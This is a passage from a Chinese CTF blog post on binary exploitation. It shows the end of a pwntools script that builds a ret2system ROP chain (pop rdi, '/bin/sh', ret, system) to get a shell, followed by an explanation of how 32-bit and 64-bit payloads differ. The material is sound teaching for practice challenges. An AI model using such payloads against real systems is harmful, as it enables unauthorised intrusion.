</span></span><span class="line"><span class="cl"><span class="n">ret</span> <span class="o">=</span> <span class="mh">0x4004fe</span> <span class="c1"># 0x00000000004004fe : ret</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0xA</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>欸为什么exp的payload中的参数不太一样？</p>
<blockquote class="alert alert-note">
    <blockquote>
<h3 id="32位和64位可执行程序的参数传递顺序"><strong>32位和64位可执行程序的参数传递顺序</strong>
</h3><p>即使思路一样但架构不一样，在写payload的时候注入地址的顺序也是不一样的：</p>
<ul>
<li><strong>32 位程序（PWN039）</strong>：32 位程序中，函数参数通过栈传递。在 PWN039 里，<code>system</code>函数地址紧跟在填充数据之后，这是因为溢出后直接覆盖返回地址为<code>system</code>函数地址，让程序执行<code>system</code>函数。在<code>payload = 'a'*(0x12 + 4) + p32(system) + p32(0) + p32(bin_sh)</code>中，<code>'a'*(0x12 + 4)</code>用于填充缓冲区并覆盖原返回地址，<code>p32(system)</code>将返回地址修改为<code>system</code>函数地址 ，<code>p32(0)</code>是为了满足栈结构，作为<code>system</code>函数执行后的返回地址（实际执行中并不重要，可随意填充 4 字节），<code>p32(bin_sh)</code>则是<code>system</code>函数的参数，即<code>/bin/sh</code>字符串的地址。这样的顺序符合 32 位程序通过栈传参和控制程序执行流的特点。</li>
<li><strong>64 位程序（PWN40）</strong>：64 位程序的函数调用规则有所不同，前 6 个参数优先通过寄存器传递，其中第一个参数存放在<code>rdi</code>寄存器。在 PWN40 中，<code>payload = 'a'*(0xA + 8) + p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(system)</code> ，<code>'a'*(0xA + 8)</code>用于填充缓冲区和覆盖原返回地址；<code>p64(pop_rdi)</code>将<code>pop_rdi</code>指令地址放入栈中，执行<code>pop_rdi</code>指令时，会把紧跟其后的<code>p64(bin_sh)</code>中的<code>/bin/sh</code>地址弹出到<code>rdi</code>寄存器，作为<code>system</code>函数的第一个参数；<code>p64(ret)</code>用于栈对齐（64 位程序调用函数前需要保证栈 16 字节对齐，<code>ret</code>指令可调整栈指针）；最后<code>p64(system)</code>将<code>system</code>函数地址放入栈中，当程序执行到这里时，会跳转到<code>system</code>函数执行，此时<code>rdi</code>寄存器中已正确设置了参数<code>/bin/sh</code>的地址。</li>
</ul></blockquote></blockquote>
<h3 id="pwn_041">PWN_041
</h3><p>题目：32位的 system(); 但是没&quot;/bin/sh&quot; ，好像有其他的可以替代。 <a class="link" href="PWN_041" >PWN_041</a></p>

</section>


    <footer class="article-footer">
    

    <section class="article-lastmod">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



        <span>
            最后更新于 2025-09-02
        </span>
    </section></footer>


    
        <link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css"integrity="sha384-n8MVd4RsNIU0tAv4ct0nTaAbDJwPJzDEaqSD1odI&#43;WdtXRGWt2kTvGFasHpSy3SV"crossorigin="anonymous"
            ><script 
                src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js"integrity="sha384-XjKyOOlGwcjNTAIQHIpgOno0Hl1YQqzUOEleOLALmuqehneUG&#43;vnGctmUb0ZY0l8"crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js"integrity="sha384-&#43;VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4&#43;/RRE05"crossorigin="anonymous"
                defer
                >
            </script><script>
    window.addEventListener("DOMContentLoaded", () => {
	const mainArticleElement = document.querySelector(".main-article");
        renderMathInElement(mainArticleElement, {
            delimiters: [
                { left: "$$", right: "$$", display: true },
                { left: "$", right: "$", display: false },
                { left: "\\(", right: "\\)", display: false },
                { left: "\\[", right: "\\]", display: true }
            ],
            ignoredClasses: ["gist"]
        });})
</script>

    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">相关文章</h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="has-image">
    <a href="/p/pwn-3/">
        
        
            <div class="article-image">
                <img src="/p/pwn-3/PWN3.4afa5f5bde601dbc35b64aebcb8c25e3_hu_a61ad70f238c03c4.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post PWN-3"
                        
                        data-hash="md5-SvpfW95gHbw1tkrry4wl4w==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">PWN-3</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/pwn-2/">
        
        
            <div class="article-image">
                <img src="/p/pwn-2/PWN2.ec0b8de7542727a390b799ae24c64af8_hu_ed10e985448522e2.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post PWN-2"
                        
                        data-hash="md5-7AuN51QnJ6OQt5muJMZK&#43;A==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">PWN-2</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/pwn-1/">
        
        
            <div class="article-image">
                <img src="/p/pwn-1/PWN.f98719505e350e475520e79f81d73a1d_hu_fb4f51a67c6d3b57.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post PWN-1"
                        
                        data-hash="md5-&#43;YcZUF41DkdVIOefgdc6HQ==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">PWN-1</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/misc/">
        
        

        <div class="article-details">
            <h2 class="article-title">MISC</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/%E7%BD%91%E5%AE%89%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E9%98%B6%E6%AE%B5/">
        
        
            <div class="article-image">
                <img src="/p/%E7%BD%91%E5%AE%89%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E9%98%B6%E6%AE%B5/%E5%B0%81%E9%9D%A2.5d92b0f978b2a3d5f8f5c87b90b35a11_hu_a3be8ec01e92cdbf.jpg" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post 第一阶段"
                        data-key="网安学习第一阶段" 
                        data-hash="md5-XZKw&#43;Xiyo9X49ch7kLNaEQ==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">第一阶段</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

     
    
        
    <script
    src="https://giscus.app/client.js"
    data-repo="Expl0rer-Ct/Expl0rer.Ct-s-Blog"
    data-repo-id="R_kgDOPd0X7g"
    data-category="Announcements"
    data-category-id="DIC_kwDOPd0X7s4CuMr6"
    data-mapping="pathname"
    data-strict="0"
    data-reactions-enabled="1"
    data-emit-metadata="0"
    data-input-position="top"
    data-theme="light"
    data-lang="en"
    data-loading=""
    crossorigin="anonymous"
    async
></script>
<script>
    function setGiscusTheme(theme) {
        let giscus = document.querySelector("iframe.giscus-frame");
        if (giscus) {
            giscus.contentWindow.postMessage(
                {
                    giscus: {
                        setConfig: {
                            theme: theme,
                        },
                    },
                },
                "https://giscus.app"
            );
        }
    }

    (function () {
        addEventListener("message", (e) => {
            if (event.origin !== "https://giscus.app") return;
            handler();
        });
        window.addEventListener("onColorSchemeChange", handler);

        function handler() {
            if (document.documentElement.dataset.scheme === "light") {
                setGiscusTheme('light');
            } else {
                setGiscusTheme('dark');
            }
        }
    })();
</script>

    

    
<script defer src="https://events.vercount.one/js"></script>
<footer class="site-footer">
    <section class="copyright">
        &copy; 
        
        2025 Expl0rer.Ct
    </section>
    
    <section class="powerby">
        



        























        
<section class="wordcount">
  <div class="wordcount-row">
    <p>博主发布了7篇文章  ||</p>
    <p>总共91.17k 字</p>
  </div>
</section>
        
  


<a>总访客数: </a><span id='busuanzi_value_site_uv'>别急在加载中了...</span> <a> | </a> <a>总访问量: </a><span id='busuanzi_value_site_pv'>加载中...</span></br>



<div class="site-uptime-container">
  <span id="timeDate" class="site-uptime-text">载入天数...</span>
  <span id="times" class="site-uptime-text">载入时分秒...</span>
</div>

<script language="javascript"> 
    var now = new Date();
    function createtime(){
        now.setTime(now.getTime()+250); 
        var grt= new Date("2025/08/01 00:00:00"); 
        days = (now - grt ) / 1000 / 60 / 60 / 24;
        dnum = Math.floor(days);
        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum);
        hnum = Math.floor(hours);
        if(String(hnum).length ==1 ){hnum = "0" + hnum;}
        minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
        mnum = Math.floor(minutes);
        if(String(mnum).length ==1 ){mnum = "0" + mnum;}
        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
        snum = Math.round(seconds);
        if(String(snum).length ==1 ){snum = "0" + snum;}

        document.getElementById("timeDate").innerHTML = "本站已稳定运行"+dnum+" 天 ";document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒"
    }
    setInterval("createtime()",250); 
</script> 

<script>
    (function(u, c) {
      var d = document, t = 'script', o = d.createElement(t),
          s = d.getElementsByTagName(t)[0];
      o.src = u;
      if (c) { o.addEventListener('load', function(e) { c(e); }); }
      s.parentNode.insertBefore(o, s);
    })('//cdn.bootcss.com/pangu/4.0.7/pangu.min.js', function() {
      pangu.spacingPage();
    });
</script>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdnjs.cloudflare.com/ajax/libs/node-vibrant/3.1.6/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script><script type="text/javascript" src="/ts/custom.89d9bb2c3c071ae8a261f67661c22b84ef67ba7b7a885dabd2bbd9ebef84ed40.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>


<head>
  
  <link rel="preconnect" href="https://fonts.font.im" crossorigin>
  <link 
    href="https://fonts.font.im/css?family=PT+Sans" 
    rel="stylesheet"
    media="print" 
    onload="this.media='all'"
    id="font-cn"
  >
  
  
  <link 
    href="https://fonts.googleapis.com/css2?family=PT+Sans" 
    rel="stylesheet"
    media="print" 
    onload="this.media='all'"
    id="font-en"
    disabled
  >
  
  <script>
    
    document.querySelector('#font-cn').addEventListener('load', function() {
      document.querySelector('#font-en').disabled = true;
    }).addEventListener('error', function() {
      document.querySelector('#font-en').disabled = false;
      document.querySelector('#font-en').media = 'all';
    });
  </script>
  
  <noscript>
    <link 
      href="https://fonts.font.im/css?family=PT+Sans" 
      rel="stylesheet"
    >
  </noscript>
</head>

<style>
    #TableOfContents > ul ul,
    #TableOfContents > ul ol,
    #TableOfContents > ol ul,
    #TableOfContents > ol ol {
        display: none;
    }
    #TableOfContents > ul .open,
    #TableOfContents > ol .open {
        display: block;
    }
</style>

<script>
    function initTocHide() {
        let toc = document.querySelector(".widget--toc");
        if (!toc) {
            return;
        }
        window.addEventListener('scroll', function() {
            let openUl = document.querySelectorAll(".open");
            if (openUl.length > 0) {
              openUl.forEach((ul) => {
                ul.classList.remove("open")
              })
            }
            let currentLi = document.querySelector(".active-class");
            if (!currentLi) {
                return
            }
            if (currentLi.children.length > 1) {
                currentLi.children[1].classList.add("open")
            }
            let ul = currentLi.parentElement;
            do {
                ul.classList.add("open");
                const parent = ul.parentElement;
                ul = parent ? parent.parentElement : null;
            } while (ul && (ul.localName === 'ul' || ul.localName === 'ol'))
        });
    }
    initTocHide()
</script>


<style>
    #backTopBtn {
        display: none;
        position: fixed;
        bottom: 30px;
        z-index: 99;
        cursor: pointer;
        width: 30px;
        height: 30px;
        background-image: url(https://expl0rer.top/icons/backTop.svg);
    }
</style>

<script>
    function initScrollTop() {
        let rightSideBar = document.querySelector(".right-sidebar");
        if (!rightSideBar) {
            return;
        }
        let btn = document.createElement("div");
        btn.id = "backTopBtn";
        btn.onclick = backToTop
        rightSideBar.appendChild(btn)
        window.addEventListener('scroll', function() {
            if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
                btn.style.display = "block";
            } else {
                btn.style.display = "none";
            }
        });
    }

    function backToTop(){
        window.scrollTo({ top: 0, behavior: "smooth" })
    }

    initScrollTop();
</script>


<style>
    .highlight {
        max-height: 400px;
        overflow: hidden;
    }

    .code-show {
        max-height: none !important;
    }

    .code-more-box {
        width: 100%;
        padding-top: 78px;
        background-image: -webkit-gradient(linear, left top, left bottom, from(rgba(255, 255, 255, 0)), to(#fff));
        position: absolute;
        left: 0;
        right: 0;
        bottom: 0;
        z-index: 1;
    }

    .code-more-btn {
        display: block;
        margin: auto;
        width: 44px;
        height: 22px;
        background: #f0f0f5;
        border-top-left-radius: 8px;
        border-top-right-radius: 8px;
        padding-top: 6px;
        cursor: pointer;
    }

    .code-more-img {
        cursor: pointer !important;
        display: block;
        margin: auto;
        width: 22px;
        height: 16px;
    }
</style>

<script>
  function initCodeMoreBox() {
    let codeBlocks = document.querySelectorAll(".highlight");
    if (!codeBlocks) {
      return;
    }
    codeBlocks.forEach(codeBlock => {
      if (codeBlock.scrollHeight <= codeBlock.clientHeight) {
        return;
      }
      let codeMoreBox = document.createElement('div');
      codeMoreBox.classList.add('code-more-box');
      let codeMoreBtn = document.createElement('span');
      codeMoreBtn.classList.add('code-more-btn');
      codeMoreBtn.addEventListener('click', () => {
        codeBlock.classList.add('code-show');
        codeMoreBox.style.display = 'none';
        window.dispatchEvent(new Event('resize'))
      })
      let img = document.createElement('img');
      img.classList.add('code-more-img');
      img.src = "https:\/\/expl0rer.top\/icons\/codeMore.png"
      codeMoreBtn.appendChild(img);
      codeMoreBox.appendChild(codeMoreBtn);
      codeBlock.appendChild(codeMoreBox)
    })
  }
  
  initCodeMoreBox();
</script>






<script>
    function showHideView() {
        let viewCounts = document.querySelectorAll("#viewCount");
        if (viewCounts) {
            let article =  document.querySelector(".article-page");
            if (!article) {
                viewCounts.forEach(ele => {
                    ele.style.display = 'none';
                });
            }
        }
    }
    
    showHideView();
</script>

<script src="https://npm.elemecdn.com/nprogress@0.2.0/nprogress.js" crossorigin="anonymous"></script>
<link rel="stylesheet" href="https://npm.elemecdn.com/nprogress@0.2.0/nprogress.css" crossorigin="anonymous" />
<script>
    NProgress.start();
    document.addEventListener("readystatechange", () => {
        if (document.readyState === "interactive") NProgress.inc(0.8);
        if (document.readyState === "complete") NProgress.done();
    });
</script>


<script>
    var pjax = new pjax({
        selectors: [
            ".main-container"
        ]
    })

</script>

<script>
    pjax._handleResponse = pjax.handleResponse;
    pjax.handleResponse = function(responseText, request, href, options) {
        if (request.responseText.match("<html")) {
            if (responseText) {
                let newDom = new DOMParser().parseFromString(responseText, 'text/html');
                let bodyClass = newDom.body.className;
                document.body.setAttribute("class", bodyClass)
            }
            pjax._handleResponse(responseText, request, href, options);
        } else {
        }
    }
</script>



<script>
    document.addEventListener('pjax:complete', () => {
        if (window.Stack && typeof window.Stack.init === 'function') {
            window.Stack.init();
        }
    })
</script>

<div id="particles-js"></div>

<script src="https://expl0rer.top/background/particles.min.js"></script>
<script>
  particlesJS.load('particles-js', "https:\/\/expl0rer.top\/background\/particlesjs-config.json", function() {
    console.log('particles.js loaded - callback');
  });
</script>

<style>
  #particles-js {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    z-index: -1;
  }
</style>


<script src="https://expl0rer.top/background/sakura.js"></script>

    </body>
</html>
